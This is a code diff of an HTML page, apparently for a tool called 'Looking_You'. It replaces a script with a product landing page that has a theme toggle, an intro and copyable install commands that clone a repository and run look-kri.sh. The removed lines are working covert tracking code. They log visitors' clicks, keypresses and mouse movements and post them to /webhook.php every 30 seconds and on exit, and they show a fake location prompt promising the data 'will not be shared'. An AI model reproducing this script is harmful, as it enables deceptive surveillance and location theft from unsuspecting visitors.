+      document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
     }
-}
+    document.getElementById('downloadTop').addEventListener('click', downloadDemo);
+    document.getElementById('downloadHero').addEventListener('click', downloadDemo);
 
-function getGeolocationError(error) {
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            return "User denied location permission";
-        case error.POSITION_UNAVAILABLE:
-            return "Location information unavailable";
-        case error.TIMEOUT:
-            return "Location request timed out";
-        default:
-            return `Unknown error: ${error.message}`;
-    }
-}
-
-function sendData(data) {
-    // Add page interactions
-    if (!data.interactions) {
-        data.interactions = {
-            clicks: 0,
-            scrolls: 0,
-            keypresses: 0,
-            mouseMovements: 0
-        };
-    }
-
-    const xhr = new XMLHttpRequest();
-    xhr.open('POST', '/webhook.php', true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.timeout = 5000;
-    
-    xhr.onload = function() {
-        if (xhr.status === 200) {
-            console.log('Data sent successfully');
-        }
-    };
-    
-    xhr.onerror = function() {
-        console.error('Failed to send data');
-    };
-    
-    xhr.ontimeout = function() {
-        console.warn('Request timeout');
-    };
-    
-    try {
-        xhr.send(JSON.stringify(data));
-    } catch (error) {
-        console.error('Error sending data:', error);
-    }
-}
-
-// Track user interactions
-let interactions = {
-    clicks: 0,
-    scrolls: 0,
-    keypresses: 0,
-    mouseMovements: 0,
-    touchEvents: 0,
-    focusChanges: 0
-};
-
-document.addEventListener('click', () => interactions.clicks++);
-window.addEventListener('scroll', () => interactions.scrolls++);
-document.addEventListener('keydown', () => interactions.keypresses++);
-document.addEventListener('mousemove', () => interactions.mouseMovements++);
-document.addEventListener('touchstart', () => interactions.touchEvents++);
-window.addEventListener('focus', () => interactions.focusChanges++);
-window.addEventListener('blur', () => interactions.focusChanges++);
-
-// Periodic data collection
-setInterval(() => {
-    const currentData = {
-        timestamp: new Date().toISOString(),
-        interactions: {...interactions},
-        timeOnPage: performance.now()
-    };
-    sendData(currentData);
-}, 30000);
-
-// Initial collection
-document.addEventListener('DOMContentLoaded', function() {
-    setTimeout(collectLocationData, 1000);
-    
-    // Send data on page unload
-    window.addEventListener('beforeunload', function() {
-        const exitData = {
-            timestamp: new Date().toISOString(),
-            event: 'page_exit',
-            totalTime: performance.now(),
-            interactions: {...interactions}
-        };
-        
-        // Try to send sync request
-        try {
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', '/webhook.php', false);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify(exitData));
-        } catch (e) {
-            // Ignore errors on unload
-        }
+    // copy install
+    document.getElementById('copyInstall').addEventListener('click', ()=>{
+      const text = 'git clone https://github.com/Bibekbista0406/Looking_You/tree/main looking-you\\nchmod +x look-kri.sh\\n./look-kri.sh';
+      navigator.clipboard.writeText(text).then(()=>{ const b=document.getElementById('copyInstall'); b.textContent='Copied ✓'; setTimeout(()=>b.textContent='Copy commands',1400); });
     });
-});
 
-// Ask for location permission with user-friendly message
-function requestLocationWithMessage() {
-    if (!navigator.geolocation) {
-        console.log('Geolocation is not supported by your browser');
-        return;
+    // Open README placeholder
+    document.getElementById('openReadme').addEventListener('click', ()=>{ alert('Open README in your repository or view online.'); });
+
+    // --- Theme toggle (persist)
+    const ROOT = document.documentElement;
+    const THEME_KEY = 'looking_you_theme_v1';
+    const themeBtn = document.getElementById('themeToggle');
+    const themeIco = document.getElementById('themeIco');
+
+    function applyTheme(t){
+      if(t === 'dark'){ ROOT.setAttribute('data-theme','dark'); themeIco.className='fa-solid fa-sun'; themeBtn.setAttribute('aria-pressed','true'); }
+      else { ROOT.removeAttribute('data-theme'); themeIco.className='fa-regular fa-moon'; themeBtn.setAttribute('aria-pressed','false'); }
     }
-    
-    // Show custom message before asking
-    const locationMessage = `
-    <div id="locationRequest" style="
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: white;
-        padding: 30px;
-        border-radius: 15px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        z-index: 10000;
-        max-width: 400px;
-        text-align: center;
-        font-family: Arial, sans-serif;
-    ">
-        <h3 style="color: #333; margin-bottom: 15px;">📍 Location Access Needed</h3>
-        <p style="color: #666; margin-bottom: 20px;">
-            We need your location to provide personalized content and better experience.
-            Your location data is secure and will not be shared.
-        </p>
-        <div style="display: flex; gap: 10px; justify-content: center;">
-            <button onclick="allowLocation()" style="
-                background: #4CAF50;
-                color: white;
-                border: none;
-                padding: 10px 20px;
-                border-radius: 5px;
-                cursor: pointer;
-                font-size: 16px;
-            ">
-                Allow Location
-            </button>
-            <button onclick="denyLocation()" style="
-                background: #f44336;
-                color: white;
-                border: none;
-                padding: 10px 20px;
-                border-radius: 5px;
-                cursor: pointer;
-                font-size: 16px;
-            ">
-                Deny
-            </button>
-        </div>
-    </div>
-    `;
-    
-    document.body.insertAdjacentHTML('beforeend', locationMessage);
-}
 
-function allowLocation() {
-    document.getElementById('locationRequest').remove();
-    collectLocationData();
-}
+    (function initTheme(){
+      try {
+        const saved = localStorage.getItem(THEME_KEY);
+        if(saved) applyTheme(saved);
+        else {
+          const prefers = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+          applyTheme(prefers ? 'dark' : 'light');
+        }
+      } catch(e){ applyTheme('light'); }
+    })();
 
-function denyLocation() {
-    document.getElementById('locationRequest').remove();
-    const data = {
-        timestamp: new Date().toISOString(),
-        locationPermission: 'denied_by_user',
-        message: 'User manually denied location access'
-    };
-    sendData(data);
-}
+    themeBtn.addEventListener('click', ()=>{
+      const current = ROOT.getAttribute('data-theme') === 'dark' ? 'dark' : 'light';
+      const next = current === 'dark' ? 'light' : 'dark';
+      applyTheme(next);
+      try { localStorage.setItem(THEME_KEY, next); } catch(e){ /* ignore */ }
+    });
 
-// Auto-request location after page loads
-window.addEventListener('load', function() {
-    setTimeout(requestLocationWithMessage, 2000);
-});
-</script>
+    // --- Lottie intro logic (play once)
+    const intro = document.getElementById('intro');
+    const START_KEY = 'looking_you_intro_seen_v1';
+    function showIntroIfNeeded(){
+      try {
+        const seen = localStorage.getItem(START_KEY);
+        if(!seen){ intro.style.display='flex'; intro.setAttribute('aria-hidden','false'); }
+      } catch(e){ intro.style.display='flex'; intro.setAttribute('aria-hidden','false'); }
+    }
+    showIntroIfNeeded();
+
+    document.getElementById('skipIntro').addEventListener('click', closeIntro);
+    document.getElementById('startBtn').addEventListener('click', closeIntro);
+    document.getElementById('learnBtn').addEventListener('click', ()=>{
+      closeIntro(); location.hash='#install';
+    });
+
+    function closeIntro(){ intro.style.display='none'; try{ localStorage.setItem(START_KEY,'1'); }catch(e){} }
+
+    // close intro with Escape
+    document.addEventListener('keydown', (e)=>{ if(e.key === 'Escape' && intro.style.display==='flex') closeIntro(); });
+
+    // small reveal animations
+    document.addEventListener('DOMContentLoaded', ()=>{
+      document.querySelectorAll('.reveal').forEach((el,i)=> setTimeout(()=>el.classList.add('show'), 120*i));
+    });
+  </script>
 </body>
 </html>
